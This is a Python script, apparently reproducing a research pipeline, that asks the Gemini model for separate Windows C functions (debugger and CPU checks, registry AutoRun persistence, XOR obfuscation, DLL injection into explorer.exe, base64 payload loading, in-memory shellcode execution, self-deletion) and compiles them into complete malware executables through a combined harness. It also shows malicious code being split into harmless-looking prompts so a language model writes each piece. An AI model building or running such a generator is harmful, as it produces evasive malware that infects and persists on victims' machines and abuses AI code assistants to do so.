#on bash, type:
#pip install google-genai
#python generator.py
import os
import subprocess
import tempfile
import time
import sys
import random
import subprocess
import uuid
import re
from pathlib import Path

CC = "gcc"
PRELUDE = r"""
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <wincrypt.h>
#include <intrin.h>
"""
NUM_VARIANTS = 5
MAX_TRIES = 5
BLOCKS_DIR = "blocks" #where variants go
OUTPUT_DIR = "generated_samples" #where combined samples go
GOOD_BLOCKS_DIR = "blocks_out"   #where "best compilable" single blocks go
NUM_SAMPLES = 5 # Number of combined samples
# --- ONE-CLICK SETUP UTILS ---
def install_package(package):
    print(f"[*] Installing required package: {package}...")
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])
        print(f"[+] {package} installed successfully.")
    except subprocess.CalledProcessError:
        print(f"[!] Failed to install {package}. Please install it manually.")
        sys.exit(1)

def check_compiler():
    print("[*] Checking for GCC compiler...")
    try:
        subprocess.run([CC, "--version"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("[+] GCC is available.")
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("[!] GCC (MinGW) not found in PATH.")
        print("    Please install MinGW-w64 to compile the generated C code.")
        sys.exit(1)

#Setup Execution
check_compiler()
try:
    from google import genai
except ImportError:
    install_package("google-genai")
    from google import genai
    
if "GEMINI_API_KEY" not in os.environ:
    print("\n[?] GEMINI_API_KEY not found in environment variables.")
    key = input("    Please enter your Gemini API Key: ").strip()
    if not key:
        print("[!] API Key is required. Exiting.")
        sys.exit(1)
    os.environ["GEMINI_API_KEY"] = key    

#Replace API_KEY with another gemini key if you 
try:
    client = genai.Client()
except Exception as e:
    # Check if a specific key not found error is raised, though a generic catch is often safer
    # for client initialization in case the library changes its specific error type.
    if "api_key" in str(e).lower():
        print("ERROR: The Gemini API key was not found. Please set the GEMINI_API_KEY environment variable.")
        print("For example, in Bash/Linux/macOS: export GEMINI_API_KEY='Your_API_Key_Here'")
        print("On Windows (CMD): set GEMINI_API_KEY=Your_API_Key_Here")
        print("On Windows (PowerShell): $env:GEMINI_API_KEY='Your_API_Key_Here'")
        exit(1)
    else:
        raise e

#Cleanup code
def clean_code(text: str) -> str:
    if not text:
        return ""
    pattern = r"```(?:c|C)?\n(.*?)```"
    match = re.search(pattern, text, re.DOTALL)
    if match:
        code = match.group(1)
    else:
        code = text
        code = re.sub(r"^#+ .*", "", code, flags=re.MULTILINE)
    return code.strip()

#Function that types a prompt to the gemini llm
def llm_call(prompt: str) -> str:
    try:
        resp = client.models.generate_content(
            model="gemini-2.0-flash", 
            contents=prompt
        )   
        return resp.text or ""
    except Exception as e:
        print(f"LLM Error: {e}")
        return ""

#Prevents the llm from being chatty
SYSTEM_INSTRUCTIONS = """
IMPORTANT: 
1. Return ONLY the C function code. 
2. Do NOT write a main() function. 
3. Do NOT provide explanations or markdown text outside the code block.
4. Ensure code is compatible with MinGW-w64 (gcc).
5. If using NTAPI, define the structs (like UNICODE_STRING) manually in the code.
"""

BLOCK_PROMPTS = {
    "Debugger_Identification": SYSTEM_INSTRUCTIONS + r"""
// Code in C
// Code for Windows
// Use the Windows API
// Write a function: BOOL Debugger_Identification();
// IMPLEMENTATION DETAILS:
// 1. Use IsDebuggerPresent()
// 2. Use CheckRemoteDebuggerPresent()
// 3. Do NOT use winternl.h or NtQueryInformationProcess (to avoid header conflicts).
""",

    "CPU_Identification": SYSTEM_INSTRUCTIONS + r"""
// Code in C
// Code for Windows
// Use the Windows API
// Write a function
// Function prototype is: BOOL
CPU_Identification();
// Identifies if running under an Intel
CPU or not

""",
    "AutoRun": SYSTEM_INSTRUCTIONS + r"""
// Code in C
// Code for Windows
// Use the Windows API
// Write a function
// Function prototype is: void AutoRun();
// Add own path to the AutoRun key
""",

    "String_XOR": SYSTEM_INSTRUCTIONS + r"""
// Code in C
// Code for Windows
// Use the Windows API
// Write a function
// Function prototype is: void String_XOR
(char *string, char *key);
// XOR string with a key
""",

    "DLL_Injection": SYSTEM_INSTRUCTIONS + r"""
// Code in C
// Code for Windows
// Use the Windows API
// Write a function
// Function prototype is: void
DLL_Injection(char *dll, char *
process);
// Inject DLL into the process
""",

    "Load_From_File": SYSTEM_INSTRUCTIONS + r"""
// Code in C
// Code for Windows
// Use the Windows API
// Write a function
// Function prototype is: int
Load_From_File(void *file, void *
buffer);
// Load file content into buffer
// Return buffer size
""",

    "Decode_Base64": SYSTEM_INSTRUCTIONS + r"""
// Code in C
// Code for Windows
// Use the Windows API
// Write a function
// Function prototype is: int
Decode_Base64(void *encoded, int size
, void *decoded);
// Decode buffer content from base64 into
another buffer
// Return buffer size
""",

    "Run_From_Memory": SYSTEM_INSTRUCTIONS + r"""
// Code in C
// Code for Windows
// Use the Windows API
// Write a function
// Function prototype is: void
Run_From_Memory(void *shellcode, int
size);
// Execute shellcode from memory
""",

    "Delete_File": SYSTEM_INSTRUCTIONS + r"""
// Code in C
// Code for Windows
// Use the Windows API
// Write a function
// Function prototype is: void
Delete_File(char *filename);
// Delete the file
""",

  "Delete_Itself": SYSTEM_INSTRUCTIONS + r"""
// Code in C
// Code for Windows
// Use the Windows API
// Write a function
// Function prototype is: void
Delete_Itself();
// Delete the current process file
"""
}

#Only generate variants for blocks we can test/compile
BLOCKS = list(BLOCK_PROMPTS.keys())

#Tiny main() programs ONLY used to check compilation (see if it runs)
#Tiny main() programs ONLY used to check compilation (see if it runs)
HARNESS = {
    # Blocks for Antivirus/CPU Evasion
    "Debugger_Identification": r"""
#include <windows.h>
#include <stdio.h>
BOOL Debugger_Identification();
int main() {
    if (Debugger_Identification()) {
        printf("Debugger detected.\n");
    } else {
        printf("No debugger detected.\n");
    }
    return 0;
}
""",
    "CPU_Identification": r"""
#include <windows.h>
#include <stdio.h>
BOOL CPU_Identification();
int main() {
    if (CPU_Identification()) {
        printf("Target CPU (Intel) identified.\n");
    } else {
        printf("Target CPU (Intel) not identified.\n");
    }
    return 0;
}
""",

    # Blocks for Persistence and Obfuscation
    "AutoRun": r"""
#include <windows.h>
#include <stdio.h>
void AutoRun();
int main() {
    printf("Attempting to set AutoRun key...\n");
    AutoRun();
    printf("AutoRun function called (check registry for results).\n");
    return 0;
}
""",
    "String_XOR": r"""
#include <windows.h>
#include <stdio.h>
#include <string.h>
void String_XOR(char *string, char *key);
int main() {
    char data[] = "SecretData";
    char key[] = "key";
    printf("Original: %s\n", data);
    String_XOR(data, key); // Encrypt
    printf("XORed: %s\n", data);
    String_XOR(data, key); // Decrypt (XOR twice)
    printf("Decrypted: %s\n", data);
    return 0;
}
""",

    # Blocks for Execution Techniques
    "DLL_Injection": r"""
#include <windows.h>
#include <stdio.h>
void DLL_Injection(char *dll, char *process);
int main() {
    printf("Simulating DLL injection into explorer.exe...\n");
    // This harness uses dummy strings just to check compilation, 
    // real execution would require existing paths and process names.
    DLL_Injection("C:\\Path\\to\\malicious.dll", "explorer.exe");
    printf("DLL Injection function called.\n");
    return 0;
}
""",
    "Load_From_File": r"""
#include <windows.h>
#include <stdio.h>
int Load_From_File(void *file, void *buffer);
int main() {
    char buffer[128] = {0};
    int n = Load_From_File("C:\\Windows\\win.ini", buffer);
    printf("Loaded %d bytes from file. Data start: %s\n", n, (char*)buffer);
    return 0;
}
""",
    "Decode_Base64": r"""
#include <windows.h>
#include <stdio.h>
#include <string.h>
int Decode_Base64(void *encoded, int size, void *decoded);
int main() {
    const char *b64 = "SGVsbG8gV29ybGQ="; // "Hello World"
    unsigned char out[64] = {0};
    int n = Decode_Base64((void*)b64, (int)strlen(b64), out);
    printf("Decoded %d bytes: %s\n", n, out);
    return 0;
}
""",
    "Run_From_Memory": r"""
#include <windows.h>
#include <stdio.h>
void Run_From_Memory(void *shellcode, int size);
int main() {
    // This is a dummy test. A real shellcode is needed for meaningful execution.
    // We just ensure the function signature compiles.
    char dummy_shellcode[] = {0x90, 0x90, 0xC3}; // NOP, NOP, RET
    printf("Attempting to run dummy shellcode from memory...\n");
    Run_From_Memory(dummy_shellcode, sizeof(dummy_shellcode));
    printf("Run_From_Memory function called.\n");
    return 0;
}
""",
    
    # Blocks for Evidence Removal
    "Delete_File": r"""
#include <windows.h>
#include <stdio.h>
void Delete_File(char *filename);
int main() {
    printf("Attempting to delete dummy file 'test_file.txt'...\n");
    // Note: This will fail if the file doesn't exist, but it checks compilation.
    // Create a dummy file here if you want successful runtime test:
    // FILE* fp = fopen("test_file.txt", "w"); if(fp) fclose(fp);
    Delete_File("test_file.txt"); 
    printf("Delete_File function called.\n");
    return 0;
}
""",
    "Delete_Itself": r"""
#include <windows.h>
#include <stdio.h>
void Delete_Itself();
int main() {
    printf("Attempting to delete current executable...\n");
    Delete_Itself();
    printf("Delete_Itself function called (may not complete execution).\n");
    return 0;
}
"""
}

COMBINED_HARNESS = r"""
#include <windows.h>
#include <stdio.h>
#include <string.h>

// Function Prototypes (must match generated blocks)
BOOL Debugger_Identification();
BOOL CPU_Identification();
void AutoRun();
void String_XOR(char *string, char *key);
void DLL_Injection(char *dll, char *process);
int Load_From_File(void *file, void *buffer);
int Decode_Base64(void *encoded, int size, void *decoded);
void Run_From_Memory(void *shellcode, int size);
void Delete_File(char *filename);
void Delete_Itself();


int main() {
    // --- 1. Defense Evasion Checks ---
    
    // Check 1: Debugger Identification (Figure 6: Start -> Debugger Identification)
    printf("[*] Running Debugger Check...\n");
    if (Debugger_Identification()) {
        printf("[!] Debugger detected. Proceeding to Evasion/Exit routine.\n");
        goto EVASION_ROUTINE;
    }
    printf("[+] Debugger NOT detected. Continuing.\n");

    // Check 2: CPU Identification (Figure 6: Debugger Identification -> CPUID Check)
    printf("[*] Running CPU Identification Check (Intel target)...\n");
    if (!CPU_Identification()) {
        printf("[!] Target CPU NOT detected. Proceeding to Evasion/Exit routine.\n");
        goto EVASION_ROUTINE;
    }
    printf("[+] Target CPU detected. Continuing execution.\n");


    // --- 2. Core Malicious Actions ---
    
    // Action 1: Persistence (Figure 6: CPUID Check -> Set AutoRun)
    printf("[*] Setting Persistence (AutoRun)...\n");
    AutoRun();

    // Setup: XOR strings and buffers (for simplicity, we use hardcoded paths/names)
    char dll_name[] = "KERNEL32.DLL"; 
    char dll_key[] = "abc";
    char process_name[] = "explorer.exe";

    // Action 2: String XOR (Figure 6: Set AutoRun -> XOR String)
    printf("[*] XOR-ing DLL name string...\n");
    String_XOR(dll_name, dll_key);
    
    // Action 3: DLL Injection (Figure 6: XOR String -> Inject DLL)
    // NOTE: We XOR back here so DLL_Injection gets the plaintext name.
    String_XOR(dll_name, dll_key); 
    printf("[*] Injecting DLL into process: %s\n", process_name);
    DLL_Injection(dll_name, process_name);
    String_XOR(dll_name, dll_key); // Re-XOR for stealth

    // Action 4: Load and Decode Payload
    char file_path[] = "C:\\path\\to\\payload.b64";
    char payload_buffer[1024] = {0};
    unsigned char decoded_shellcode[1024] = {0};
    int n_read, n_decoded;

    // Load file (Figure 6: Load File)
    printf("[*] Loading payload from file: %s\n", file_path);
    n_read = Load_From_File(file_path, payload_buffer);
    
    // Decode Base64 (Figure 6: Decode Base64)
    printf("[*] Decoding Base64 payload (Size: %d)...\n", n_read);
    n_decoded = Decode_Base64(payload_buffer, n_read, decoded_shellcode);
    
    // Action 5: Execute Payload (Figure 6: Run Memory)
    if (n_decoded > 0) {
        printf("[*] Running shellcode from memory (Size: %d)...\n", n_decoded);
        Run_From_Memory(decoded_shellcode, n_decoded);
        printf("[+] Shellcode execution initiated.\n");
    } else {
        printf("[!] Payload decoding failed. Exiting.\n");
    }

    // --- 3. Normal Exit ---
    printf("[✔] Malicious workflow complete. Exiting normally.\n");
    return 0;


    // --- 4. Evasion and Exit Routine (Figure 6: Delete File -> Delete Itself -> Exit) ---
    EVASION_ROUTINE:
    
    // Action 6: Delete associated library file
    printf("[*] Deleting associated file: %s\n", dll_name);
    Delete_File(dll_name);
    
    // Action 7: Delete own executable
    printf("[*] Deleting self (Evidence removal)...\n");
    Delete_Itself();

    printf("[!] Evasion complete. Exiting.\n");
    return -1;
}
"""

# --------- Compilation Check ---------------
def try_compile(block_name: str, code: str):
    harness = HARNESS[block_name]
    with tempfile.TemporaryDirectory() as td:
        cpath = Path(td) / f"{block_name}.c"
        exepath = Path(td) / f"{block_name}.exe"
        full_source = PRELUDE + "\n" + code + "\n\n" + harness
        cpath.write_text(full_source, encoding="utf-8")
        cmd = [CC, str(cpath), "-o", str(exepath), "-lcrypt32", "-lpsapi"]
        proc = subprocess.run(cmd, capture_output=True, text=True)
        return proc.returncode == 0, (proc.stdout + proc.stderr)


#Generating variants of the benign files
def generate_variants():
    os.makedirs(BLOCKS_DIR, exist_ok=True)

    for block in BLOCKS:
        block_path = os.path.join(BLOCKS_DIR, block)
        os.makedirs(block_path, exist_ok=True)

        prompt = BLOCK_PROMPTS[block]

        for v in range(1, NUM_VARIANTS + 1):
            print("=" * 80)
            print(f"Generating variant {v}/{NUM_VARIANTS} for block: {block}")
            print("=" * 80)

            # retry until we get a compilable variant
            for attempt in range(1, MAX_TRIES + 1):
                print(f"Attempt {attempt}/{MAX_TRIES}...")
                raw = llm_call(prompt)          # 1) get LLM output
                
                # --- ADDED DEBUGGING LINE ---
                if not raw:
                    print("⚠️ LLM returned EMPTY content. Retrying...")
                    time.sleep(1.0)
                    continue
                # --- END ADDED DEBUGGING LINE ---
                
                code = clean_code(raw)          # 2) strip fences / junk
                ok, log = try_compile(block, code)  # 3) compile cleaned code
                if ok:
                    out_file = os.path.join(block_path, f"variant_{v}_ok.c")
                    with open(out_file, "w", encoding="utf-8") as f:
                        f.write(clean_code(code))
                    print(f"✅ Compiled. Saved {out_file}")
                    break
                else:
                    print("❌ Compile failed. Full log:")
                    print(log)
                    time.sleep(1.0)

            else:
                print(f"⚠️ Could not get a compilable variant for {block} (v={v}).")


#Combine benign blocks  (Only the ones that compile correctly)
def assemble_sample():
    sample_id = str(uuid.uuid4())[:8]
    sample_dir = os.path.join(OUTPUT_DIR, f"sample_{sample_id}")
    os.makedirs(sample_dir, exist_ok=True)

    combined_path = os.path.join(sample_dir, "combined.c")

    with open(combined_path, "w", encoding="utf-8") as out:
        out.write(PRELUDE + "\n\n")

        for block in BLOCKS:
            path = os.path.join(BLOCKS_DIR, block)
            variants = [v for v in os.listdir(path) if v.endswith("_ok.c")]

            if not variants:
                raise RuntimeError(f"No compilable variants found for block '{block}'")

            chosen = random.choice(variants)
            chosen_full = os.path.join(path, chosen)

            print(f"[+] Using {block}: {chosen}")

            with open(chosen_full, "r", encoding="utf-8") as f:
                out.write(f.read().strip() + "\n\n")
        out.write(COMBINED_HARNESS)
    return combined_path, sample_dir

# ------------------------------------------
# 3. "COMPILING Combined sample"
# ------------------------------------------
#Compile the benign block
def compile_to_pe(c_file, out_dir):
    exe_path = os.path.join(out_dir, "output.exe")
    cmd = [
        CC,
        c_file,
        "-o", exe_path,
        "-lcrypt32",
        "-lpsapi",
    ]

    print("[*] Compiling combined sample...")
    proc = subprocess.run(cmd, capture_output=True, text=True)
    if proc.returncode != 0:
        print(proc.stderr)
        raise RuntimeError("Combined compile failed")

    print(f"[+] Output PE: {exe_path}")
    return exe_path


def main():
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    os.makedirs(GOOD_BLOCKS_DIR, exist_ok=True)

    # 1. Generate the building blocks (The "Ingredients")
    generate_variants()

    # 2. Assemble multiple unique samples (The "Meals")
    print(f"\n[*] Assembling {NUM_SAMPLES} unique samples from the generated blocks...")
    
    for i in range(1, NUM_SAMPLES + 1):
        print(f"\n--- Generating Sample {i}/{NUM_SAMPLES} ---")
        try:
            # Pick random blocks and combine them
            c_file, folder = assemble_sample()
            
            # Compile this specific combination
            compile_to_pe(c_file, folder)
        except Exception as e:
            print(f"[-] Failed to create sample {i}: {e}")

    print("\n[✔] Done. Check the 'generated_samples' folder.")

if __name__ == "__main__":
    main()

